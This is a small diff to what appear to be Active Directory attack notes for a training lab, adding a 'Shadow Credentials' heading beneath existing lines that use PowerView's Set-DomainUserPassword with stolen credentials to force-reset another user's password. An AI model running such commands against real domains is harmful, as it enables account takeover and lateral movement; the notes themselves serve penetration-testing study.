@@ -11,3 +11,6 @@ $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley
 Import-Module .\PowerView.ps1
 Set-DomainUserPassword -Identity USER_TO_CHANGE_PASS -AccountPassword $PASS_OBJECT -Credential $Cred -Verbose
 ```
+
+
+## Shadow Credentials
